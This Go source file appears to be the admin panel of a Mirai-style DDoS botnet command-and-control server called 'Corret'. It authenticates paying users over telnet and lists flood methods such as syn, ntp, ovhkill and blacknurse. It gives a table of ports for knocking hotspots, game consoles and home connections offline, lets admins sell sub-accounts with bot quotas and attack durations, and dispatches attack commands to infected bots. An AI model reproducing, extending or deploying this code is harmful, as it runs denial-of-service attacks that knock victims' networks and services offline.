package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;36mUsername \033[1;37m-> \033[1;36m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;36mPassword \033[1;37m-> \033[1;36m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[1;36mPlease Wait While Corret Approves Your Connection \033[1;36m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(150) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    //if credentials are incorrect output error and close session
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mERROR: \033[1;36mCorret Said Your Details Werent Correct\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Boats:[%d] - Connected As: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\033[1;36mWelcome \033[1;37m" + username + "\033[1;36m Type\033[1;37m: ?\r\n"))

    
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;36mCorret \033[1;37m-> \033[1;36m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "" {
            continue
        }
        
        if err != nil || cmd == "cls" { // clear screen 
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\033[1;36mWelcome \033[1;37m" + username + "\033[1;36m Type\033[1;37m: ?\r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
            this.conn.Write([]byte("\033[1;37m ╔══════════════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mmeth      \033[1;37m->   \033[1;36mShows Attack Commands         \033[1;37m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mports     \033[1;37m->   \033[1;36mShows What Port Info          \033[1;37m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mads       \033[1;37m->   \033[1;36mShows Admin Commands          \033[1;37m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mbots      \033[1;37m->   \033[1;36mShows Bots and Archs          \033[1;37m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mcls       \033[1;37m->   \033[1;36mClears The Terminal           \033[1;37m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mlogout    \033[1;37m->   \033[1;36mExits From The Terminal       \033[1;37m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mcredits   \033[1;37m->   \033[1;36mExits From The Terminal       \033[1;37m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mcommands  \033[1;37m->   \033[1;36mShows Available Commands      \033[1;37m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚══════════════════════════════════════════════╝ \033[0m \r\n"))
            continue
        }
        if cmd == "ports" || cmd == "ports" || cmd == "?p" { // display help menu
          this.conn.Write([]byte("\033[1;37m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mHOTSPOT PORTS:                     VERIZON 4G LTE:                 \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mUDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mTCP - 2859, 5000                   TCP - 53                        \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║                                                                    ║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mAT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots           \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port          \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║                                                                    ║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mSTANDARD PORTS:                                                    \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mHOME: 80, 53, 22, 8080                                             \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mXBOX: 3074                                                         \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mPS4: 9307                                                          \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mPS3:                                                               \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mTCP:3478, 3479, 3480, 5223                                         \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mUDP:3478, 3479                                                     \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mHOTSPOT: 9286                                                      \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mVPN: 7777                                                          \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mNFO: 1192                                                          \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mOVH: 992                                                           \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ║ \033[1;36mHTTP: 80, 8080,443                                                 \033[1;37m║\r\n"))
          this.conn.Write([]byte("\033[1;37m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }

                if cmd == "commands" || cmd == "cmds" || cmd == "?c" { // display help menu
            this.conn.Write([]byte("\033[1;37m ╔═════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║  \033[1;36mping           \033[1;37m║      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║  \033[1;36mnmap           \033[1;37m║      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║  \033[1;36miplookup       \033[1;37m║      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚═════════════════╝   \033[0m \r\n"))
            continue
        }
        
        
        if cmd == "METH" || cmd == "meth" || cmd == "?m" {                          
            this.conn.Write([]byte("\033[1;37m ╔══════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mvse        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36msyn        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mdns        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mstd        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mudp        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mack        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mpan        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mntp        \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36msnmp       \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mhome       \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mgame       \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mxmas       \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mstomp      \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mgreip      \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mstdhex     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mackhex     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mtcphex     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mudphex     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36movhhex     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))     
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mtcppsh     \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n")) 
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36movhkill    \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))       
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mudpplain   \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mphatwonk   \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mblacknurse \033[1;37m-> \033[1;36mip time dport=port     \033[1;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚══════════════════════════════════════╝   \033[0m \r\n"))                                                                      
            continue
        }

        if cmd == "CREDITS" || cmd == "credits" {
            this.conn.Write([]byte("\033[1;37m      \r\n"))
            this.conn.Write([]byte("\033[1;37m ╔══════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mImproved By \033[1;36m-> Sanity        \033[1;37m║     \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mOriginal Creater \033[1;36m-> Private  \033[1;37m║     \033[0m \r\n"))         
            this.conn.Write([]byte("\033[1;37m ╚══════════════════════════════╝\033[0m \r\n"))                                                                      
            continue                                                      
        }

        if userInfo.admin == 1 && cmd == "ads" {
            this.conn.Write([]byte("\033[1;37m ╔═════════════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mREMOVE   \033[1;37m->   \033[1;36mRemove User Menu          \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mADDBASIC \033[1;37m->   \033[1;36mAdd Basic Client Menu     \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[1;36mADDADMIN \033[1;37m->   \033[1;36mAdd Admin Client Menu     \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚═════════════════════════════════════════╝  \r\n"))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "out" {
            return
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[1;36mUsername\033[1;36m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;36mPassword\033[1;36m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[1;36m(\033[0m-1 for access to all\033[1;36m)\033[0m:\033[1;36m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[1;36m(\033[0m-1 for none\033[1;36m)\033[0m:\033[1;36m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[1;36m(\033[0m0 for none\033[1;36m)\033[0m:\033[1;36m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[1;36m" + new_un + "\r\n\033[0m- Password - \033[1;36m" + new_pw + "\r\n\033[0m- Bots - \033[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;36m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;36m(\033[01;32my\033[1;36m/\033[1;36mn\033[1;36m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

         if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" {
            this.conn.Write([]byte("\033[1;36mIP Address\x1b[0m: \033[1;36m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;36mResponse\033[1;36m: \r\n\033[1;36m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "PING" || cmd == "ping" {
            this.conn.Write([]byte("\033[1;36mIP Address\x1b[0m: \033[1;36m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;36mResponse\033[1;36m: \r\n\033[1;36m" + locformatted + "\r\n"))
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[1;36mUsername \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;36mAre You Sure You Want To Remove \033[1;36m" + rm_un + "?\033[1;36m(\033[01;32my\033[1;36m/\033[1;36mn\033[1;36m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;36mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;36mUser Successfully Removed!\r\n"))
            }
            continue
        }

            if err != nil || cmd == "NMAP" || cmd == "nmap" {                  
            this.conn.Write([]byte("\033[1;36mIP Address\033[1;36m: \x1b[35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\033[1;36m: \r\n\033[1;36m" + locformatted + "\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[1;36mUsername\033[1;36m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;36mPassword\033[1;36m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[1;36m(\033[0m-1 for access to all\033[1;36m)\033[0m:\033[1;36m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[1;36m(\033[0m-1 for none\033[1;36m)\033[0m:\033[1;36m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[1;36m(\033[0m0 for none\033[1;36m)\033[0m:\033[1;36m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[1;36m" + new_un + "\r\n\033[0m- Password - \033[1;36m" + new_pw + "\r\n\033[0m- Bots - \033[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;36m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;36m(\033[01;32my\033[1;36m/\033[1;36mn\033[1;36m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s:\x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[1;36mTotal Bots\033[1;37m: \033[1;37m[\033[1;36m%d\033[1;37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[1;37m[\033[1;36m+\033[1;37m] \033[1;36mCommand sent to \033[0;37m%d \033[1;36mBoats\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}